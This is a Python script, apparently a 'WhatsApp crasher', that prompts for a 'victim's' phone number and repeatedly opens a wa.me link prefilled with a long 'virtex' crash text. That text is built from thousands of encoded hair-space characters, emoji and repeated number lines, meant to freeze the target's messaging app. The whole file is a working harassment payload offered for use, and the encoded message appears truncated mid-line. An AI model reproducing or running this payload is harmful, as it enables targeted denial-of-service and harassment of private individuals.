import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y  = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")

logo = f"""
{R}╔╗╔╗╔╦╗─╔╦═══╦════╦═══╦═══╦═══╦═══╗
║║║║║║║─║║╔═╗║╔╗╔╗║╔═╗║╔═╗║╔═╗║╔═╗║
║║║║║║╚═╝║║─║╠╝║║╚╣╚══╣║─║║╚═╝║╚═╝║
║╚╝╚╝║╔═╗║╚═╝║─║║─╚══╗║╚═╝║╔══╣╔══╝
╚╗╔╗╔╣║─║║╔═╗║─║║─║╚═╝║╔═╗║║──║║
─╚╝╚╝╚╝─╚╩╝─╚╝─╚╝─╚═══╩╝─╚╩╝──╚╝
{G}█▀▀ █▀█ ▄▀█ █▀ █░█ █▀▀ █▀█ {C}Coded By Ansh Dadwal
{G}█▄▄ █▀▄ █▀█ ▄█ █▀█ ██▄ █▀▄ {C}Crash Txt by @Baapg 
"""
os.system('clear')
def main():
	os.system('clear')
	print(logo)
	print(G)
	number=input(f"{G}[+] Enter the Victim's Phone number with country Code\n\n{G}=> ")
	print()
	crash=int(input(f'[+] Enter the number of crashes {W}(Max 25 per 240 Min) \n\n=> '))
	link = (f"""xdg-open https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
""")
	for i in range (crash):
		print()
		print(f"{Y}[✓] Sending Now")
		link1 = os.system(link)
		time.sleep(5)
		if link1 == 0:
			print(f"{G} Successful")
			pass
		else:
			print(f"{G}[×] Failed  ")
		time.sleep(0.2)
	return main()
main()
	
